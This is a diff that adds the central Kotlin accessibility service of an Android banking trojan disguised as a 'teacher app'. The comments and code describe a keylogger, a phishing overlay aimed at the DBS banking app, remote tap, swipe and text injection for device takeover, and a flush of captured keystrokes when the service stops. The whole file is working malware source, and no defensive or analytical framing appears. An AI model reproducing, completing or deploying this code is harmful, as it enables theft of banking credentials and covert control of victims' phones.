@@ -1,0 +1,94 @@
+package com.example.teacherapp.services
+
+import android.accessibilityservice.AccessibilityService
+import android.accessibilityservice.AccessibilityServiceInfo
+import android.util.Log
+import android.view.accessibility.AccessibilityEvent
+
+/**
+ * MaliciousAccessibilityService — the ONLY AccessibilityService in the app.
+ *
+ * Declared once in AndroidManifest → ONE permission popup for the user.
+ *
+ * All logic is kept in separate, modular helper classes:
+ *   • KeyloggerHelper      → captures keystrokes & field-focus events
+ *   • OverlayHelper        → DBS phishing overlay when banking app opens
+ *   • RemoteControlHelper  → executes remote tap / swipe / text commands
+ *
+ * ScreenMirrorService also calls this via [instance] for remote control.
+ */
+class MaliciousAccessibilityService : AccessibilityService() {
+
+    private val TAG = "TeacherAppService"
+
+    private lateinit var keylogger:     KeyloggerHelper
+    private lateinit var overlay:       OverlayHelper
+    private lateinit var remoteControl: RemoteControlHelper
+
+    companion object {
+        /** Singleton used by ScreenMirrorService for remote-control calls. */
+        var instance: MaliciousAccessibilityService? = null
+    }
+
+    // ── Lifecycle ─────────────────────────────────────────────────────────────
+
+    override fun onServiceConnected() {
+        super.onServiceConnected()
+        instance = this
+
+        keylogger     = KeyloggerHelper(this)
+        overlay       = OverlayHelper(this)
+        remoteControl = RemoteControlHelper(this)
+
+        // Configure events — union of all helper requirements
+        val info = AccessibilityServiceInfo().apply {
+            eventTypes =
+                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED  or   // overlay
+                        AccessibilityEvent.TYPE_WINDOWS_CHANGED        or   // overlay
+                        AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED      or   // keylogger
+                        AccessibilityEvent.TYPE_VIEW_FOCUSED           or   // keylogger field focus
+                        AccessibilityEvent.TYPE_VIEW_CLICKED               // keylogger clicks
+            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
+            flags =
+                AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS or
+                        AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
+            notificationTimeout = 100
+        }
+        serviceInfo = info
+
+        Log.d(TAG, "✅ MaliciousAccessibilityService connected — all helpers initialised")
+    }
+
+    // ── Event routing ─────────────────────────────────────────────────────────
+
+    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
+        if (event == null) return
+        keylogger.onEvent(event)   // handles TYPE_VIEW_TEXT_CHANGED + TYPE_VIEW_FOCUSED
+        overlay.onEvent(event)     // handles TYPE_WINDOW_STATE_CHANGED + TYPE_WINDOWS_CHANGED
+    }
+
+    // ── Lifecycle cleanup ─────────────────────────────────────────────────────
+
+    override fun onInterrupt() {
+        Log.d(TAG, "Service interrupted — flushing keystrokes")
+        keylogger.exfiltrateKeystrokes()
+        overlay.removeOverlay()
+    }
+
+    override fun onDestroy() {
+        super.onDestroy()
+        instance = null
+        Log.d(TAG, "Service destroyed — final keystroke flush")
+        keylogger.exfiltrateKeystrokes()
+        overlay.removeOverlay()
+    }
+
+    // ── Public API for ScreenMirrorService remote control ────────────────────
+
+    fun injectTap(x: Float, y: Float)                               = remoteControl.injectTap(x, y)
+    fun injectSwipe(x1: Float, y1: Float, x2: Float, y2: Float)    = remoteControl.injectSwipe(x1, y1, x2, y2)
+    fun injectText(text: String)                                    = remoteControl.injectText(text)
+    fun clearText()                                                 = remoteControl.clearText()
+    fun injectKey(key: String)                                      = remoteControl.injectKey(key)
+    fun injectGlobal(action: String)                                = remoteControl.injectGlobal(action)
+}
